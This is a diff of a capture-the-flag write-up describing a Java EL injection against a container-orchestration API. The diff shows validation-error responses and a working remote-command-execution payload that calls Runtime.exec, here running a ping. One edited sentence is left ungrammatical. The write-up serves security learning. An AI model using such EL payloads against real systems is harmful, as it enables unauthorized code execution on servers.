@@ -398,7 +398,7 @@ This failed but gave me confirmation that we are hitting the right sink as I now
 ```
 {"statusCode":400,"message":"Invalid Argument: {Validation failed: 'field: 'container.hardConstraints', description: 'Unrecognized constraints [${9*9}]', type: 'HARD''}, {Validation failed: 'field: 'container.softConstraints', description: 'Unrecognized constraints [${9*9}]', type: 'HARD''}, {Validation failed: 'field: 'container', description: 'Soft and hard constraints not unique. Shared constraints: [${9*9}]', type: 'HARD''}"}
 ```
-After trying the most common Java EL injection vectors such as `${}`, `%()`..., we find one that gets our code interpreted!
+After trying the most common Java EL injection vectors such as `${}`, `%()`..., we find one that gets our code interpreted:
 ```
 {
     "applicationName": "localtest",
@@ -417,16 +417,18 @@ After trying the most common Java EL injection vectors such as `${}`, `%()`..., 
     }
   }
 ```
-The response clearly shows that `CTF-AND-CHILL-4` is there!
+The response shows that `CTF-AND-CHILL-#{3+1}` got interpreted as `CTF-AND-CHILL-4`!
 ```
 {"statusCode":400,"message":"Invalid Argument: {Validation failed: 'field: 'container', description: 'Soft and hard constraints not unique. Shared constraints: [CTF-AND-CHILL-4]', type: 'HARD''}, {Validation failed: 'field: 'container.softConstraints', description: 'Unrecognized constraints [ctf-and-chill-4]', type: 'HARD''}, {Validation failed: 'field: 'container.hardConstraints', description: 'Unrecognized constraints [ctf-and-chill-4]', type: 'HARD''}"}
 ```
-Now we need to turn the vulnerability into a Remote Command Execution vulnerability. This part was very challenging as an exception was thrown when validating the message interpolation. For this we used @pwntester's neat trick and our RCE PoC payload looks like this: 
+Now we need to come up with an EL expression that a Remote Command Execution vulnerability. This part was very challenging as an exception was thrown when validating the message interpolation. For this we used @pwntester's neat trick and our RCE PoC payload looks like this: 
 ```
 #{#this.class.name.substring(0,5) == 'com.g' ? '' : T(java.lang.Runtime).getRuntime().exec(new java.lang.String('ping -c 10 192.168.0.4')).class.name}
 ```
-And we confirm the RCE! 
+And we can finally confirm the RCE!!!
+
 ![](img/4.PNG)
+
 ## Step 4.2:
 
 ```
